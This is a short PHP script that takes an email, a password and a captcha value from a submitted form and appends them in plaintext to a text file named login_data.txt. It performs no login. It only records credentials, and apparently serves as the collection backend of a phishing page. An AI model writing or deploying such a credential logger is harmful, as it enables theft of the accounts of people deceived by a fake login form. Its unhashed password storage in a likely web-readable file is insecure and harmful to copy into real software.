<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $email = $_POST['Email'] ?? '';
    $password = $_POST['Password'] ?? '';
    $captcha = $_POST['text'] ?? '';

    // Validate the form data (you can add your validation logic here)

    // Prepare the data to be written to the file
    $data = "Email: $email\nPassword: $password\nCaptcha: $captcha\n";

    // Define the file name
    $filename = 'login_data.txt';

    // Write the data to the file
    if (file_put_contents($filename, $data, FILE_APPEND | LOCK_EX) !== false) {
        echo "Login data has been saved successfully.";
    } else {
        echo "An error occurred while saving login data.";
    }
}
?>
